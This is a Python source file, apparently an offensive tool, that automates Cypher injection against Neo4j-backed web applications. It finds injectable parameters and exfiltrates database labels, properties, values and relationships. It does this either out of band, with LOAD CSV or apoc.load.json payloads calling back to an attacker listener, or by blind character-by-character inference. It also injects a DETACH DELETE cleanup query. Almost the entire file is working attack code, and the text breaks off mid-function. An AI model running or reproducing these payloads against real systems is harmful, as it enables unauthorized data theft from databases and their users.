#!/usr/bin/python3
import argparse
import requests
from urllib.parse import unquote, quote
import threading
import socket
from http.server import HTTPServer, BaseHTTPRequestHandler
import netifaces as ni
import queue
import re
import sys
import json
import os
import string
import random
import time
import math
from tabulate import tabulate
from pyngrok import ngrok
from packaging import version
from termcolor import colored


data_queue = queue.Queue()

# Helper functions
def get_ip_address(network_interface):
    """Retrieve the IP address for a given network interface."""
    return ni.ifaddresses(network_interface)[ni.AF_INET][0]['addr']

def extract_query_params(query_string):
    """
    Extracts param=value into json format
    """
    pattern = re.compile(r'([^&=?]+)=([^&=?]+)')
    matches = pattern.findall(query_string)
    return {key: value for key, value in matches}


def get_data(timeout=5):
    """
    URL Decode and return value ?data=value
    """
    try:
        data = data_queue.get(timeout=timeout)
        parsed_data = extract_query_params(data)
        # %2520 -> %20 -> <space>
        parsed_data = {unquote(unquote(key)): unquote(unquote(value)) for key, value in parsed_data.items()}
        value = parsed_data.get('data')
        return value


    except queue.Empty:
        print(colored("[!] Injection failed, did not receive request from listener.", "red"))
        return None


def get_parsed_data(timeout=5):
    """
    URL Decode and return dictionary {data: ''}
    """
    try:
        data = data_queue.get(timeout=timeout)
        parsed_data = extract_query_params(data)
        # %2520 -> %20 -> <space>
        parsed_data = {unquote(unquote(key)): unquote(unquote(value)) for key, value in parsed_data.items()}
        return parsed_data

    except queue.Empty:
        print(colored("[!] Injection failed, did not receive request from listener. WAF maybe ?","red"))
        return None


def fully_dynamic_convert_data(original_data):
    """
    Format dictionary
    """
    converted_data = {}

    # Process each key in the original dictionary
    for key, compound_value in original_data.items():
        # Split the compound value into components based on '::'
        components = compound_value.split('::')
        
        # Iterate over each component
        for component in components:
            # Split the component into index and the actual value, after decoding
            index, value = component.split(':', 1)

            # Ensure a dictionary for the index exists in converted_data
            if index not in converted_data:
                converted_data[index] = {}

            # Assign the value to the correct key within the indexed dictionary
            converted_data[index][key] = value

    # Ensure all dictionaries have all keys from the original data, set to None if not present
    all_keys = list(original_data.keys())
    for index_dict in converted_data.values():
        for key in all_keys:
            index_dict.setdefault(key, None)

    return converted_data

def convert_dict_to_table(data):    
    if not data:
        return "The input data is empty."
    
    # add header ID
    headers = ['ID'] + list(next(iter(data.values())).keys())
    table_data = []

    for index, attributes in data.items():
        # create a row for each item, prepending the index
        # skip ID header
        row = [index] + [attributes.get(header) for header in headers[1:]]  
        table_data.append(row)

    # Use tabulate to generate the table
    table = tabulate(table_data, headers=headers, tablefmt="grid")
    print(table)

def write_json_to_file(json_data, filename="output.json"):
    output_dir = os.path.join(os.getcwd(), "output")
    if not os.path.exists(output_dir):
        os.makedirs(output_dir)
    
    file_path = os.path.join(output_dir, filename)
    with open(file_path, 'w') as file:
        file.write(json.dumps(json_data, indent=2))

def write_list_to_file(list_data):
    with open("output/relationships.txt", 'w') as file:
        for item in list_data:
            file.write(f"{item}\n")


def check_vulnerability(apoc_version):
    """
    Checks if the given version is affected by any of the vulnerabilities
    """
    vulnerability_data = {
        "CVE-2021-42767: Path traversal in several apoc.* functions": [("0", "3.5.0.17"), ("0", "4.2.0.10"), ("0", "4.3.0.4"), ("0", "4.4.0.1")],
        "CVE-2022-37423: Partial Path Traversal Vulnerability": [("0", "4.4.0.8"), ("0", "4.3.0.7"), ("0", "4.2.0.12"), ("0", "4.1.0.12"), ("0", "3.5.0.20")],
        "CVE-2022-23532: Path Traversal Vulnerability": [("0", "4.3.0.12"), ("0", "4.4.0.12")],
        "CVE-2023-23926: XML External Entity (XXE) vulnerability in apoc.import.graphml": [("0", "4.4.0.14")]
    }
    affected_advisories = []
    counter = 0
    current_version = version.parse(apoc_version)
    for advisory, affected_ranges in vulnerability_data.items():
        for lower, upper in affected_ranges:
            if version.parse(lower) <= current_version < version.parse(upper):
                affected_advisories.append(advisory)
                counter += 1
                break  # Stop checking other ranges for this advisory if already found affected

    if affected_advisories:
        print(f"\nAPOC Version {apoc_version} is affected by these vulnerabilities [{counter}]:")
        for advisory in affected_advisories:
            print(f"[*] {advisory}")
    else:
        print(f"APOC Version {apoc_version} is not affected by the known vulnerabilities.")


class RequestHandler(BaseHTTPRequestHandler):
    """Handles HTTP GET requests."""
    def do_GET(self):
        data_queue.put(self.path)
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        self.wfile.write(b"Received")
    
    def log_message(self, format, *args):
        return

class Listener():
    """A simple HTTP server listening for data."""
    def __init__(self, port):
        self.server = HTTPServer(("0.0.0.0", port), RequestHandler)

    def start_listener(self):
        self.server.serve_forever()

    def stop_listener(self):
        self.server.shutdown()

class oob_Neo4jInjector:
    """Handles the injection of payloads into a Neo4j database with out of band exfiltration."""
    def __init__(self, target, exfil_ip, listen_port, request_type, parameters, cookie=None):
        self.target = target
        self.exfil_ip = f"{exfil_ip}:{str(listen_port)}"
        self.request_type = request_type
        self.parameters = parameters
        self.cookie = cookie if cookie else ""
        self.headers = {'User-Agent': 'curl/8.5.0', 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': self.cookie}
        self.proxies = {}
        #self.proxies = {'http': 'http://127.0.0.1:8080'}
        self.exfil_payload = ""
        self.working_char = "UNDEFINED"

    def inject_payload(self, payload):
        """Inject a crafted payload to the target and return the response object."""
        responses = []
        if (self.working_char != "UNDEFINED"):
            full_payload = f"{self.working_char}{payload}"
            encoded_payload = quote(full_payload, safe='')
            url, data = self.prepare_request_data(encoded_payload)
            response = self.execute_request(url, data)
            responses.append(response)
        else:
            for injection_char in ["'", "\"", "'})", "\"})", ""]:
                full_payload = f"{injection_char}{payload}"
                encoded_payload = quote(full_payload, safe='')
                url, data = self.prepare_request_data(encoded_payload)
                response = self.execute_request(url, data)
                responses.append(response)
        return responses

    def prepare_request_data(self, encoded_payload):
        """Prepare the URL and data for the request."""
        if self.request_type == "API":
            url = f"{self.target}{self.parameters}{encoded_payload}"
            data = None
        elif self.request_type == "GET":
            url = f"{self.target}?{self.parameters}={encoded_payload}"
            data = None
        elif self.request_type == "POST":
            url = self.target
            data = f"{self.parameters}={encoded_payload}"
        else:
            raise ValueError("Invalid request type")
        return url, data

    def execute_request(self, url, data=None):
        """Execute the HTTP request with the prepared data and return the response."""
        try:
            response = requests.post(url, data=data, headers=self.headers, proxies=self.proxies, allow_redirects=False) if data else requests.get(url, headers=self.headers, proxies=self.proxies, allow_redirects=False)
            if response.status_code == 302:
                print(colored("[!] WARNING, 302 Redirect, Cookies Expired/Invalid ?", "red"))
                sys.exit()
            return response  # Return the response object
        except requests.exceptions.RequestException as e:
            print(colored(f"Error occurred: {e}", "red"))
        return None

    def detect_inject(self):
        animation = "|/-\\"
        anim_index = 0
        random.seed(time.strftime("%H:%M:%S", time.localtime()))
        self.random_num = random.randint(0, 999)
        csv_exfil = f"LOAD CSV FROM '{self.exfil_ip}/?data='+exfilData as l RETURN 1337 as x//"
        apoc_exfil = f"CALL apoc.load.json('{self.exfil_ip}/?data='+exfilData) YIELD value RETURN 1337 as x//"
        csv = False
        apoc = False
        print("")
        # injection_characters = ["'", "\"", "'})", "\"})", f"{random_num}"]
        injection_characters = [
            f"{self.random_num}'",
            f"{self.random_num}\"",
            f"{self.random_num}')}}",
            f"{self.random_num}\"}}",
            f"{self.random_num}"
        ]
        for injection_character in injection_characters:
            print(f"[{animation[anim_index % len(animation)]}] Checking injectability with LOAD CSV", end='\r', flush=True)
            anim_index += 1
            self.working_char = injection_character
            payload = f" RETURN 1 as x UNION WITH 1 as exfilData {csv_exfil}"
            self.inject_payload(payload)
            if (get_data()):
                self.exfil_payload = csv_exfil
                csv = True
                break
        for injection_character in injection_characters:
            print(f"[{animation[anim_index % len(animation)]}] Checking injectability with APOC", end='\r', flush=True)
            anim_index += 1
            if (not csv):
                self.working_char = injection_character
            payload = f" RETURN 1 as x UNION WITH 1 as exfilData {apoc_exfil}"
            self.inject_payload(payload)
            if (get_data()):
                self.exfil_payload = apoc_exfil
                apoc = True
                break
            if (csv):
                break

        if (csv and apoc):
            print("APOC detected, retrieving APOC version...")
            self.inject_payload(f" RETURN 1 as x UNION WITH apoc.version() as exfilData {self.exfil_payload}")
            apoc_version = get_data()
            nested_dict = {'-': {'apoc_version': apoc_version}}
            convert_dict_to_table(nested_dict)
            check_vulnerability(apoc_version)
            option = input("\nUse APOC to exfiltrate? (y|N): ").lower()
            if option == "y":
                self.exfil_payload = csv_exfil
            else:
                print(colored("\n[*] Continuing with LOAD CSV [*]", "yellow"))
            return True
        
        elif (csv and not apoc):
            print(colored("No APOC detected, continuing with LOAD CSV...", "yellow"))
            return True
        
        elif (not csv and apoc):
            print(colored("Only APOC detected, continuing with APOC...", "yellow"))
            return True
        
        elif (not csv and not apoc):
            self.working_char = "UNDEFINED"
            self.exfil_payload = csv_exfil
            print(" " * 500, end='\r')
            return False
        
    def get_version(self):
        print("\n[*] Version Check [*]")
        self.inject_payload(f" RETURN 1 as x UNION CALL dbms.components() YIELD name, versions, edition UNWIND versions as version WITH DISTINCT replace(name,' ', '%20') as name,version,edition WITH name +':'+version+':'+edition as exfilData {self.exfil_payload}")

        version_parts = get_data().split(':')
        name, version, edition = version_parts[0], version_parts[1], version_parts[2]

        if version_parts:
            nested_dict = {'-': {'name': name, 'version': version, 'edition': edition}}
            convert_dict_to_table(nested_dict)
        elif ("apoc" not in self.exfil_payload):
            if (input(colored("[!] LOAD CSV blocked, try with APOC? (y|N) ", "red")).lower() == "y"):
                self.exfil_payload = f"CALL apoc.load.json('{self.exfil_ip}/?data='+exfilData) YIELD value RETURN 1337 as x//"
                self.get_version()
            sys.exit()
        else:
            print(colored("[!] Out of band exfiltration blocked", "red"))
            sys.exit()

        if edition == 'enterprise':
            print(colored("\n[!] Neo4j Enterprise edition is detected, RBAC configuration could be blocking our payload.\n", "yellow"))

    def dump_labels(self):
        # dump label count
        self.inject_payload(f" RETURN 1 as x UNION CALL db.labels() yield label WITH COUNT(DISTINCT label) as exfilData {self.exfil_payload}")

        label_count = get_data()
        
        # dump labels
        self.inject_payload(f" RETURN 1 as x UNION CALL db.labels() yield label WITH DISTINCT label as exfilData WITH COLLECT(exfilData) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")

        labels = get_data().split('::') 

        print(f"\n[*] available labels [{label_count}]:")
        for label in labels:
            print(f"[+] {label}")

        return labels

    
    def dump_properties(self, labels):
        properties_dict = {}
        for label in labels:
            self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) UNWIND keys(x) as p WITH DISTINCT p WITH COLLECT(p) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")

            print(f"\n[*] Label: {label}")
            properties = get_data().split('::')
            properties_dict[label] = properties
            print(f"[+] available properties [{len(properties)}]:")

            for pr0perty in properties:
                print(f"[++] {pr0perty}")

        return properties_dict

    def dump_values(self, properties_dict):
        for label, properties in properties_dict.items():
            print(f"\n[*] Label: {label}")
            print(f"[+] available properties [{len(properties)}]")
            values_dict = {}
            for pr0perty in properties:
                self.inject_payload(f" RETURN 1 as x UNION MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH id(x) + ':' + x.{pr0perty} as id_{pr0perty}  WITH COLLECT(DISTINCT(id_{pr0perty})) AS list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
                parsed_data = get_parsed_data()
                parsed_data[pr0perty] =  parsed_data.pop("data")
                values_dict.update(parsed_data)
                print(f"[++] {pr0perty}") 
            formatted_dict = fully_dynamic_convert_data(values_dict)
            write_json_to_file(formatted_dict, f'{label}.json')
            convert_dict_to_table(formatted_dict)

        return 
        
    def dump_rels(self):
        print(colored("\n[*] exfiltrating relationships", "yellow"))
        # dump relationship types
        self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[relationship]-(node2) WITH COLLECT(DISTINCT(type(relationship))) as list WITH REDUCE(mergedString = '', value in list | mergedString+value+'::') as exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")

        rel_types = get_data()
        if rel_types is None:
            print(colored("[!] WARNING, The database might not have any relationships. Exiting...", "red"))
            sys.exit()

        rel_types = rel_types.split('::')
        print(f"\n[*] relationships types [{len(rel_types)}]:")
        for rel_type in rel_types:
            print(f"[+] {rel_type}")

        # dump relationships
        verfied_rels = []
        counter = 0 
        for rel_type in rel_types:
            # Initial payload injection to get relationships list
            self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[:{rel_type}]->(node2) WITH DISTINCT node1, node2 WITH toString(id(node1)) + ':{rel_type}:' + toString(id(node2)) as rows WITH COLLECT(rows) AS list WITH REDUCE(mergedString = '', value IN list | mergedString+value+'::') AS exfilData WITH SUBSTRING(exfilData, 0, SIZE(exfilData) - 2) as exfilData WITH replace(exfilData, ' ', '%20') as exfilData {self.exfil_payload}")
            
            rels = get_data().split('::')

            for rel in rels:
                rel_parts = rel.split(':')
                id1, rel_type, id2 = rel_parts[0], rel_parts[1], rel_parts[2]
                # verify relationship
                # process each relationship direction
                for id_from, id_to in [(id1, id2), (id2, id1)]:
                    self.inject_payload(f" RETURN 1 as x UNION MATCH (node1)-[:{rel_type}]->(node2) WHERE id(node1) = {id_from} and id(node2) = {id_to} WITH DISTINCT node1, node2  UNWIND labels(node1) as label1 UNWIND labels(node2) as label2 WITH label1 + ':' + id(node1) + '-[:{rel_type}]-%3E' + label2 + ':' + id(node2) as exfilData {self.exfil_payload}")
                    if not data_queue.empty():
                        counter += 1
                        rel = get_data()
                        verfied_rels.append(rel)
            
        write_list_to_file(verfied_rels)

        print(f"\n[*] available relationships [{counter}]")
        for rel_type in rel_types:
            print(f"[+] {rel_type}")
            for rel in verfied_rels:
                regex_rel_type = re.findall(r"\[:([^\]]+)\]", rel)[0]
                if regex_rel_type == rel_type:
                    print(f"[++] {rel}")

    def clean_up(self):
        # fix this
        self.inject_payload(f" RETURN 1 as x UNION MATCH (n) WHERE ANY(key IN keys(n) WHERE n[key] IN [{self.random_num}, '{self.random_num}']) AND NOT EXISTS ((n)--()) DETACH DELETE n RETURN 1337 as x//")

    def oob_dump_all(self):
        labels = self.dump_labels()
        properties_dict = self.dump_properties(labels)
        values_dict = self.dump_values(properties_dict)



class ib_Neo4jInjector:
    """Handles the injection of payloads into a Neo4j database."""
    def __init__(self, target, listen_port, request_type, parameters, cookie=None, blind_string=""):
        self.target = target
        #self.exfil_ip = f"{exfil_ip}:{str(listen_port)}"
        self.request_type = request_type
        self.parameters = parameters
        self.cookie = cookie if cookie else ""
        self.blind_string = blind_string
        self.headers = {'User-Agent': 'curl/8.5.0', 'Content-Type': 'application/x-www-form-urlencoded', 'Cookie': self.cookie}
        self.proxies = {}
        #self.proxies = {'http': 'http://127.0.0.1:8080'}
        self.base_case = None
        self.working_char = ""

    def inject_payload(self, payload):
        """Inject a crafted payload to the target and return the response object."""
        responses = []
        if (self.working_char != "UNDEFINED"):
            full_payload = f"{self.blind_string}{self.working_char}{payload}"
            encoded_payload = quote(full_payload, safe='')
            url, data = self.prepare_request_data(encoded_payload)
            response = self.execute_request(url, data)
            responses.append(response)
        else:
            for injection_char in ["'", "\"", "'})", "\"})", ""]:
                full_payload = f"{self.blind_string}{injection_char}{payload}"
                encoded_payload = quote(full_payload, safe='')
                url, data = self.prepare_request_data(encoded_payload)
                response = self.execute_request(url, data)
                responses.append(response)
        return responses

    def prepare_request_data(self, encoded_payload):
        """Prepare the URL and data for the request."""
        if self.request_type == "API":
            url = f"{self.target}{self.parameters}{encoded_payload}"
            data = None
        elif self.request_type == "GET":
            url = f"{self.target}?{self.parameters}={encoded_payload}"
            data = None
        elif self.request_type == "POST":
            url = self.target
            data = f"{self.parameters}={encoded_payload}"
        else:
            raise ValueError("Invalid request type")
        return url, data

    def execute_request(self, url, data=None):
        """Execute the HTTP request with the prepared data and return the response."""
        try:
            response = requests.post(url, data=data, headers=self.headers, proxies=self.proxies, allow_redirects=False) if data else requests.get(url, headers=self.headers, proxies=self.proxies, allow_redirects=False)
            if response.status_code == 302:
                print(colored("302 Redirect, Cookies Expired/Invalid ?", "red"))
                sys.exit()
            return response  # Return the response object
        except requests.exceptions.RequestException as e:
            print(colored(f"Error occurred: {e}", "red"))
        return None

    def check_true(self, result):
        if (result):
                if (result.text == self.base_case.text):
                    return True
                elif (self.blind_string in result.text):
                    base_split = self.base_case.text.split(self.blind_string)
                    res_split = result.text.split(self.blind_string)
                    if (len(base_split) == len(res_split)):
                        true_count = 0
                        for i in range(len(res_split)):
                            if (base_split[i] == res_split[i]):
                                true_count += 1
                        return (true_count >= math.ceil(len(res_split) * 0.9))
        return False

    def detect_inject(self):
        animation = "|/-\\"
        anim_index = 0
        random.seed(time.strftime("%H:%M:%S", time.localtime()))
        random_num = random.randint(0, 999)
        print("")
        injection_characters = ["'", "\"", "'})", "\"})", ""]
        encoded_payload = quote(self.blind_string, safe='')
        url, data = self.prepare_request_data(encoded_payload)
        self.base_case = self.execute_request(url, data)
        if (not self.base_case or self.base_case.status_code == 500):
            if (input(colored("Seems like something went wrong, continue? (y|N)", "red")).lower != "y"):
                sys.exit()
        for injection_character in injection_characters:
            print(f"[{animation[anim_index % len(animation)]}] Checking injectability", end='\r', flush=True)
            anim_index += 1
            injection_case = None
            self.working_char = injection_character
            if (self.working_char == ""):
                payload = f" OPTIONAL MATCH (x:foobar) WHERE {random_num} = {random_num}"
            elif (self.working_char == "'})"):
                payload = " OPTIONAL MATCH (x:foo {bar: '" + str(random_num)
            elif (self.working_char == "\"})"):
                payload = " OPTIONAL MATCH (x:foo {bar: \"" + str(random_num)
            else:
                payload = f" OPTIONAL MATCH (x:foo) WHERE {self.working_char}{random_num}{self.working_char}={self.working_char}{random_num}"
            injection_case = self.inject_payload(payload)[0]
            if (self.check_true(injection_case)):
                return True
        self.working_char = "UNDEFINED"
        print(" " * 500, end='\r')
        return False
            

    def complete_blind_payload(self, condition):
        random.seed(time.strftime("%H:%M:%S", time.localtime()))
        random_num = random.randint(0, 999)
        if (self.working_char == ""):
            payload = f" AND {condition} AND {random_num} = {random_num}"
        elif (self.working_char == "'})"):
            payload = " WHERE " + condition + " OPTIONAL MATCH (x:foo {bar: '" + str(random_num)
        elif (self.working_char == "\"})"):
            payload = " WHERE " + condition + " OPTIONAL MATCH (x:foo {bar: \"" + str(random_num)
        else:
            payload = f" AND {condition} AND {self.working_char}{random_num}{self.working_char}={self.working_char}{random_num}"
        return payload

    def find_label_count(self):
        animation = "|/-\\"
        anim_index = 0
        for count_index in range(1000):
            if count_index == 999:
                print(colored("It is vulnerable to injection, however Neo4j version is < 5.3, unless labels > 1000, if so increase range OR try out-of-band injection (--out-of-band).", "red"))
                sys.exit()
            responses = self.inject_payload(self.complete_blind_payload(f"COUNT {{CALL db.labels() YIELD label RETURN label}} = {count_index}"))
            print(f"[{animation[anim_index % len(animation)]}] dumping label counts, might take awhile", end='\r', flush=True)
            anim_index += 1
            for response in responses:
                if (self.check_true(response)):
                    print(" " * 150, end='\r')
                    return count_index

    def find_label_sizes(self, label_count):
        animation = "|/-\\"
        anim_index = 0
        label_sizes_dict = {}
        for count_index in range(label_count):
            break_flag = False
            for size_index in range(1000):
                responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SIZE(toString(list[{count_index}])) = {size_index} RETURN list}}"))
                print(f"[{animation[anim_index % len(animation)]}] dumping label sizes, might take awhile", end='\r', flush=True)
                anim_index += 1
                for response in responses:
                    break_flag = self.check_true(response)
                    if (break_flag):
                        label_sizes_dict[count_index] = size_index
                        break
                if (break_flag):
                    break
        print(" " * 150, end='\r')
        return label_sizes_dict

    def dump_labels(self, label_sizes):
        print(f"\n[*] available labels [{len(label_sizes)}]")
        valid_chars = string.ascii_letters + string.digits + string.punctuation + ' '
        labels = []
        animation = "|/-\\"
        anim_index = 0
        for count_index, size in label_sizes.items():
            label = ''
            for size_index in range(size):
                break_flag = False
                for char in valid_chars:
                    responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{CALL db.labels() YIELD label WITH COLLECT(label) AS list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
                    print(f"[{animation[anim_index % len(animation)]}] building label: {label}{char}", end='\r', flush=True)
                    anim_index += 1
                    for response in responses:
                        break_flag = self.check_true(response)
                        if (break_flag):
                            label += char
                            break
                    if (break_flag):
                        break
            print(" " * 150, end='\r')
            print(f"[+] {label}")
            labels.append(label)
        return labels


    def find_property_counts(self, labels):
        property_counts_dict = {}
        animation = "|/-\\"
        anim_index = 0
        for label in labels:
            break_flag = False
            for count_index in range(1000):
                responses = self.inject_payload(self.complete_blind_payload(f"COUNT {{MATCH (x:{label}) UNWIND keys(x) as properties RETURN DISTINCT properties}} = {count_index}"))
                print(f"[{animation[anim_index % len(animation)]}] dumping property counts, might take awhile", end='\r', flush=True)
                anim_index += 1
                for response in responses:
                    break_flag = self.check_true(response)
                    if (break_flag):
                        property_counts_dict[label] = count_index
                        break
                if (break_flag):
                    break
        print(" " * 150, end='\r')
        return property_counts_dict

    def find_property_sizes(self, property_counts_dict):
        property_sizes_dict = {}
        animation = "|/-\\"
        anim_index = 0
        for label, count in property_counts_dict.items():
            for count_index in range(count):
                break_flag = False 
                for size_index in range(1000):
                    # Construct and send your query
                    responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH COLLECT(DISTINCT(properties)) AS list WHERE SIZE(toString(list[{count_index}])) = {size_index} RETURN list}}"))
                    print(f"[{animation[anim_index % len(animation)]}] dumping property sizes, might take awhile", end='\r', flush=True)
                    anim_index += 1
                    for response in responses:
                        break_flag = self.check_true(response)
                        if (break_flag):
                                if label not in property_sizes_dict:
                                    property_sizes_dict[label] = {}
                                # Now that we're sure label exists in value_counts, record the count
                                property_sizes_dict[label][count_index] = size_index
                                break  # Stop searching after finding the blind string for this property
                    if (break_flag):
                        break
        print(" " * 150, end='\r')
        return property_sizes_dict


    def dump_properties(self, property_sizes_dict):
        valid_chars = string.ascii_letters + string.digits + string.punctuation + ' '
        properties_dict = {}
        animation = "|/-\\"
        anim_index = 0
        for label, size_dict in property_sizes_dict.items():
            print(f"\n[*] Label: {label}")
            print(f"[+] available properties [{len(size_dict)}]:")
            for count_index, size in size_dict.items():
                pr0perty = ''
                for size_index in range(size):
                    break_flag = False
                    for char in valid_chars:
                        responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (x:{label}) UNWIND keys(x) as properties WITH DISTINCT properties WITH COLLECT(properties) as list WHERE SUBSTRING(toString(list[{count_index}]),{size_index},1) = '{char}' RETURN list}}"))
                        print(f"[{animation[anim_index % len(animation)]}] building property: {pr0perty}{char}", end='\r', flush=True)
                        anim_index += 1
                        for response in responses:
                            break_flag = self.check_true(response)
                            if (break_flag):
                                    pr0perty += char
                                    break 
                        if (break_flag):
                            break
                print(" " * 150, end='\r') 
                print(f"[++] {pr0perty}")
                if label in properties_dict:
                    properties_dict[label].append(pr0perty)
                else:
                    properties_dict[label] = [pr0perty]
        return properties_dict

    def find_value_counts(self, properties_dict):
        value_counts_dict = {}
        animation = "|/-\\"
        anim_index = 0
        for label, properties in properties_dict.items():
            for pr0perty in properties:
                break_flag = False
                for count_index in range(1000):
                    responses = self.inject_payload(self.complete_blind_payload(f"COUNT {{MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' RETURN x.{pr0perty}}} = {count_index}"))
                    print(f"[{animation[anim_index % len(animation)]}] dumping value counts, might take awhile", end='\r', flush=True)
                    anim_index += 1
                    for response in responses:
                        break_flag = self.check_true(response)
                        if (break_flag):
                            # Ensure the label is in value_counts, creating a dict for it if not
                            if label not in value_counts_dict:
                                value_counts_dict[label] = {}
                            # Now that we're sure label exists in value_counts, record the count
                            value_counts_dict[label][pr0perty] = count_index
                            break  # Stop searching after finding the blind string for this property
                    if (break_flag):
                        break
        print(" " * 150, end='\r')       
        return value_counts_dict


    def find_value_sizes(self, value_counts_dict):
        value_sizes_dict = {}
        animation = "|/-\\"
        anim_index = 0
        for label, properties_dict in value_counts_dict.items():
            value_sizes_dict[label] = {}
            for pr0perty, count in properties_dict.items():
                value_sizes_dict[label][pr0perty] = {}
                for count_index in range(count): 
                    break_flag = False
                    for size_index in range(1000):  
                        responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH COLLECT(toString(id(x)) + '::' + x.{pr0perty}) as list WHERE SIZE(toString(list[{count_index}])) = {size_index} RETURN list}}"))
                        print(f"[{animation[anim_index % len(animation)]}] dumping value counts, might take awhile", end='\r', flush=True)
                        anim_index += 1
                        for response in responses:
                            break_flag = self.check_true(response)
                            if (break_flag):
                                if count_index not in value_sizes_dict[label][pr0perty]:
                                    value_sizes_dict[label][pr0perty][count_index] = size_index
                                break  # Found the size for this occurrence, no need to continue
                        if (break_flag):
                            break
        print(" " * 150, end='\r')
        return value_sizes_dict

    def dump_values(self, value_sizes_dict):
        valid_chars = string.ascii_letters + string.digits + string.punctuation + ' '
        values_dict = {}
        animation = "|/-\\"
        anim_index = 0
        for label, properties_dict in value_sizes_dict.items():
            print(f"\n[*] Label: {label}")
            print(f"[+] available properties [{len(properties_dict)}]:")

            if label not in values_dict:
                values_dict[label] = {}

            for pr0perty, size_dict in properties_dict.items():
                print(f"[++] {pr0perty} [{len(size_dict)}]:")

                if pr0perty not in values_dict[label]:
                    values_dict[label][pr0perty] = {}

                for count_index, size in size_dict.items():
                    value = ''
                    for size_index in range(size):
                        break_flag = False
                        for char in valid_chars:
                            responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{ MATCH (x:{label}) WHERE x.{pr0perty} IS NOT NULL AND x.{pr0perty} <> '' WITH COLLECT(toString(id(x)) + '::' + x.{pr0perty}) as list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
                            print(f"[{animation[anim_index % len(animation)]}] building value: {value}{char}", end='\r', flush=True)
                            anim_index += 1
                            for response in responses:
                                break_flag = self.check_true(response)
                                if (break_flag):
                                    value += char
                                    break  # Found the size for this occurrence, no need to continue
                            if (break_flag):
                                break
                    print(" " * 150, end='\r') 
                    print(f"[+++] {''.join(value.split('::')[1::])}")

                    values_dict[label][pr0perty][count_index] = value

        # convert to json format and display as table
        for label, properties in values_dict.items():
            print(f"\n[*] Label: {label}")
            property_names = list(properties.keys())
            print(f"[+] available properties [{len(property_names)}]:")
            for prop in property_names:
                print(f"[++] {prop}")
            
            ids_and_values = {}
            for prop, id_value_dict in properties.items():
                for id_key, value in id_value_dict.items():
                    id_str, actual_value = value.split('::', 1)
                    if id_str not in ids_and_values:
                        ids_and_values[id_str] = {}
                    ids_and_values[id_str][prop] = actual_value

            json_output = {}
            for id_str, values in ids_and_values.items():
                # Initialize a dictionary for the current ID if not already present
                if id_str not in json_output:
                    json_output[id_str] = {}
                for prop in property_names:
                    # Assign the property value or None if the property does not exist for the current ID
                    json_output[id_str][prop] = values.get(prop, None)

            write_json_to_file(json_output, f'{label}.json')
            convert_dict_to_table(json_output)

        return(values_dict)

    def find_rel_type_counts(self):
        animation = "|/-\\"
        anim_index = 0
        for count_index in range(1000):
            if count_index == 999:
                print(colored("[!] WARNING, The database might not have any relationships. Exiting...", "red"))
                sys.exit()
            responses = self.inject_payload(self.complete_blind_payload(f"COUNT {{MATCH (node1)-[relationship]-(node2) RETURN DISTINCT(type(relationship))}} = {count_index}"))
            print(f"[{animation[anim_index % len(animation)]}] dumping relationship type counts, might take awhile", end='\r', flush=True)
            anim_index += 1
            for response in responses:
                if (self.check_true(response)):
                    print(" " * 150, end='\r')
                    return count_index

    def find_rel_type_sizes(self, rel_type_counts):
        animation = "|/-\\"
        anim_index = 0
        rel_type_sizes_dict = {}
        for count_index in range(rel_type_counts):
            break_flag = False
            for size_index in range(1000):
                responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (node1)-[relationship]-(node2) WITH COLLECT(DISTINCT(type(relationship))) as list WHERE SIZE(toString(list[{count_index}])) = {size_index} RETURN list}}"))
                print(f"[{animation[anim_index % len(animation)]}] dumping relationship type sizes, might take awhile", end='\r', flush=True)
                anim_index += 1
                for response in responses:
                    break_flag = self.check_true(response)
                    if (break_flag):
                        rel_type_sizes_dict[count_index] = size_index
                        break
                if (break_flag):
                    break
        print(" " * 150, end='\r')
        return rel_type_sizes_dict

    def dump_rel_types(self, rel_type_sizes_dict):
        print(f"\n[*] available relationship [{len(rel_type_sizes_dict)}]")
        valid_chars = string.ascii_letters + string.digits + string.punctuation + ' '
        rel_types = []
        animation = "|/-\\"
        anim_index = 0
        for count_index, size in rel_type_sizes_dict.items():
            rel_type = ''
            for size_index in range(size):
                break_flag = False
                for char in valid_chars:
                    responses = self.inject_payload(self.complete_blind_payload(f"EXISTS {{MATCH (node1)-[relationship]-(node2) WITH COLLECT(DISTINCT(type(relationship))) as list WHERE SUBSTRING(toString(list[{count_index}]), {size_index}, 1) = '{char}' RETURN list}}"))
                    print(f"[{animation[anim_index % len(animation)]}] building relationship type: {rel_type}{char}", end='\r', flush=True)
                    anim_index += 1
                    for response in responses:
